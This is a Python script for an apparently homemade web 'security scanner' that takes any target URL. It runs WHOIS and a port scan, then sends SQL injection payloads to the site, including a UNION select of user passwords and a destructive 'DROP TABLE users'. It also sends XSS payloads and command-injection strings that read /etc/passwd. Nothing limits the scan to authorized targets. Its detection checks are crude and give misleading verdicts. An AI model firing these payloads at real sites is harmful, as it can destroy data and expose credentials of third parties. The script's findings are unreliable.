import requests
import pyfiglet
from colorama import Fore, Style, init
import socket
import os
import threading
import time
import whois

init(autoreset=True)

class WebSec:
    def __init__(self, url):
        if not url.startswith(("http://", "https://")):
            self.url = "http://" + url
        else:
            self.url = url

    def print_custom_art(self):
        print("\n")
        custom_art = """
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░  
        """
        screen_width = os.get_terminal_size().columns
        lines = custom_art.strip().split('\n')
        for line in lines:
            print(Fore.RED + line.center(screen_width) + Style.RESET_ALL)

    def test_sql_injection(self):
        payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' AND SLEEP(5) --",
            "' UNION SELECT NULL, username, password FROM users --",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]
        
        print("\nTesting for SQL Injection vulnerability...")
        found_vulnerability = False
        severity = "None"
        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)
                if response.status_code == 200 and "error" not in response.text.lower():
                    severity = "High"
                    print(f"{Fore.RED}Potential SQL Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                    found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")
        
        if not found_vulnerability:
            print(f"{Fore.GREEN}No SQL Injection vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}SQL Injection severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}SQL Injection vulnerability testing completed.")

    def test_xss(self):
        payloads = [
            "<script>alert('XSS');</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='\";alert(1);//'>"
        ]
        
        print("\nTesting for XSS vulnerabilities...")
        found_vulnerability = False
        severity = "None"
        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)

                if response.status_code == 200:
                    if payload in response.text or "alert(1)" in response.text:
                        severity = "High"
                        print(f"{Fore.RED}Potential XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")
        
        if not found_vulnerability:
            print(f"{Fore.GREEN}No XSS vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}XSS severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}XSS testing completed.")

    def test_csrf(self):
        print("\nTesting for CSRF vulnerabilities...")
        session = requests.Session()
        response = session.get(self.url, timeout=5)
        
        if "csrf" in response.text.lower() or "token" in response.text.lower():
            print(f"\n{Fore.GREEN}CSRF protection mechanism detected in the form of tokens.{Style.RESET_ALL}")
            print(f"{Fore.RED}CSRF severity: Low{Style.RESET_ALL}\n")
        else:
            print(f"\n{Fore.RED}No CSRF protection mechanism detected.{Style.RESET_ALL}")
            print(f"{Fore.RED}CSRF severity: High{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}CSRF testing completed.")

    def test_command_injection(self):
        payloads = [
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls",
            "&& ls",
            "| ls"
        ]
        
        print("\nTesting for Command Injection vulnerabilities...")
        found_vulnerability = False
        severity = "None"
        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)
                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ["root:", "bin/bash", "usr"]):
                    severity = "High"
                    print(f"{Fore.RED}Potential Command Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                    found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")
        
        if not found_vulnerability:
            print(f"\n{Fore.GREEN}No Command Injection vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}Command Injection severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}Command Injection testing completed.")

    def get_whois_info(self):
        print("\nRetrieving WHOIS information...")
        domain = self.url.split("://")[-1].split("/")[0]
        try:
            whois_info = whois.whois(domain)
            print(Fore.GREEN + str(whois_info) + Style.RESET_ALL)
        except Exception as e:
            print(f"\n{Fore.RED}Error retrieving WHOIS information: {e}{Style.RESET_ALL}")

    def test_open_ports(self):
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 3306: 'MySQL',
            3389: 'RDP'
        }
        print("\nScanning for open ports...")
        host = self.url.split("://")[-1].split("/")[0].split(":")[0]
        try:
            ip_address = socket.gethostbyname(host)
        except socket.gaierror:
            print(f"{Fore.RED}Unable to resolve IP address for the host: {host}{Style.RESET_ALL}")
            return
        
        open_ports = []

        for port, service in common_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append((port, service))
            sock.close()
        if open_ports:
            for port, service in open_ports:
                print(f"\n{Fore.RED}Open port detected: Port {port} ({service}){Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}No open ports detected.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Open ports testing completed.\n")

def loading_animation(task_description):
    animation = "|/-\\"
    idx = 0
    global loading
    while loading:
        print(f"\r{Fore.CYAN}{task_description} {animation[idx % len(animation)]}{Style.RESET_ALL}", end="")
        idx += 1
        time.sleep(0.1)

if __name__ == "__main__":
    tester = WebSec("http://example.com")
    tester.print_custom_art()
    
    while True:
        try:
            url = input(Fore.YELLOW + "\nEnter the target URL : " + Style.RESET_ALL)
            tester = WebSec(url)
            host = tester.url.split("://")[-1].split("/")[0].split(":")[0]
            ip_address = socket.gethostbyname(host)
            print(Fore.GREEN + f"IP Address: {ip_address}\n" + Style.RESET_ALL)
            break
        except ValueError as e:
            print(f"{Fore.RED}{e}{Style.RESET_ALL}")
        except socket.gaierror:
            print(f"{Fore.RED}Invalid URL. Please try again.{Style.RESET_ALL}\n")

    loading = True
    threading.Thread(target=loading_animation, args=("Retrieving WHOIS information...",)).start()
    tester.get_whois_info()
    loading = False
    time.sleep(0.5)

    loading = True
    threading.Thread(target=loading_animation, args=("Scanning for open ports...",)).start()
    tester.test_open_ports()
    loading = False
    time.sleep(0.5)

    loading = True
    threading.Thread(target=loading_animation, args=("Testing for SQL Injection vulnerabilities...",)).start()
    tester.test_sql_injection()
    loading = False
    time.sleep(0.5)
    
    loading = True
    threading.Thread(target=loading_animation, args=("Testing for XSS vulnerabilities...",)).start()
    tester.test_xss()
    loading = False
    time.sleep(0.5)

    loading = True
    threading.Thread(target=loading_animation, args=("Testing for CSRF vulnerabilities...",)).start()
    tester.test_csrf()
    loading = False
    time.sleep(0.5)
    
    loading = True
    threading.Thread(target=loading_animation, args=("Testing for Command Injection vulnerabilities...",)).start()
    tester.test_command_injection()
    loading = False
    time.sleep(0.5)
    
   
